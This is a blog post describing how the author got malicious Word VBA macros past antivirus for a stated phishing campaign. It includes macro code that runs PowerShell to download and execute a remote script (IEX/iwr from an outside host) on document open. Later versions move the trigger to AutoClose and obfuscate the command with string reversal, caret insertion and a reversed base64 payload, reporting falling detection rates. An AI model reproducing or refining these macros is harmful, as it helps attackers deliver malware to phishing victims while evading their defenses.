---
title: Bypass AV with VBA
date: "2021-11-04T22:40:32.169Z"
description: How my MalDoc bypassed AV.
---

So I wanted to start a phishing campaign and sadly every maldoc seems to fail bypassing AV for some reason

I've already taken the OSEP course so I do have some knowledge when it comes to AV bypass techniques


### What can I do now?

Well it was pretty confusing on how to approach this problem as whenever I used `Document_Open` or `AutoOpen` in my macro AV would detect it pretty easily.

### What is the problem?

Let's take this first example which is pretty simple and pretty familiar 

```vb
Sub MyMacro()
    cmd = "powershell.exe -nop -c ""IEX(iwr http://10.10.10.10/evil.ps1)"""
    Shell cmd
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
Well if we think about it what is happening is when a document is opened we call the function `MyMacro` which will trigger the execution of an in-memory powershell agent

I tried various obfuscation methods, that helped in reducing the total number of AV detections, but still the number was high for my taste

I finally figured out that the problem might not be with `MyMacro` but instead `AutoOpen` as I would expect any half decent AV (including Defender) would go after functions that are ran at the startup of a word document 

Well what can I do??

### Events

As explained here in the [Microsoft documentation](https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros), We have more than one event to play around with!

AutoExec/AutoNew/AutoClose/AutoExit

Which are all not as heavily used as the infamous `AutoOpen`.

So let's try again with another event this time 

For the sake of making this pretty simple I'll just end up using `AutoClose` which will trigger whenever the document was closed instead.

### First Attempt 

I tried using the following snippet and tested it against antivirus solutions 

```vb
Sub MyMacro()
MsgBox "Evil stuff should happen now"
cmd = "cmd.exe /k powershell.exe -nop -enc [base64 blob of payload]"
Shell cmd
End Sub

Sub AutoClose()
MyMacro
End Sub
```

Sadly it got detected at a rate of `10/26`

![Image](https://i.imgur.com/UdJPOEJ.png)


### Second Attempt

Ok we got it now, let's use some basic obfuscation and see what happens 

I just tried to reverse a small part of the payload `cmd.exe` 

```vb
Sub MyMacro()
MsgBox "Evil stuff should happen now"
cmd = "exe.dmc"
cmd2 = " /k powershell.exe -nop -enc [base64 blob of payload]"
fcmd = StrReverse(cmd) & cmd2
Shell fcmd
End Sub

Sub AutoClose()
MyMacro
End Sub
```

Ok now we reduced the hit by a little but we still got a long way to go 

![Image](https://i.imgur.com/NxoRuDt.png)


### Third Attempt

Now I've seen this trick before being referenced to bypass EDR's and AV's when executing commands with `cmd.exe`

You would just need to add `^` between characters and it would resolve it as a null value and ignore it apparently ? Am not particularly sure on the reason but it seems to work!

So if we tried something like `net users` and `n^e^t us^er^s` both would result the same output but one is obfuscated while the other isn't (Must be ran within a command prompt)

So I adjusted my payload by a little bit and ended with something like this 

```vb
Sub MyMacro()
MsgBox "Evil stuff should happen now"
cmd = "exe.dmc"
cmd2 = " /k p^O^wE^R^S^h^E^l^L^.^e^X^e -^n^o^p -^e^n^c [base64 blob of payload]"
fcmd = StrReverse(cmd) & cmd2
Shell fcmd
End Sub

Sub AutoClose()
MyMacro
End Sub
```

And that seems to work in obfuscating some AV's too!

![Image](https://i.imgur.com/9n8T6eK.png)


### Final attempt

Now all we can do is just try obfuscating even more and more

So I decided to reverse the `base64 blob` and it would look something like this 

```vb
Sub MyMacro()
MsgBox "Evil stuff should happen now"
cmd = "exe.dmc"
cmd2 = " /k p^O^wE^R^S^h^E^l^L^.^e^X^e -^n^o^p -^e^n^c "
cmd3 = "[Reversed base64 blob of payload]"
fcmd = StrReverse(cmd) & cmd2 & StrReverse(cmd3)
Shell fcmd
End Sub

Sub AutoClose()
MyMacro
End Sub
```

And the final result was amazing! we only got `4/26` hits

![Image](https://i.imgur.com/i37qyB5.png)


### Conclusion

Try other event triggers, and try some easy obfuscation methods you never know what might work

Thank you for sticking around!
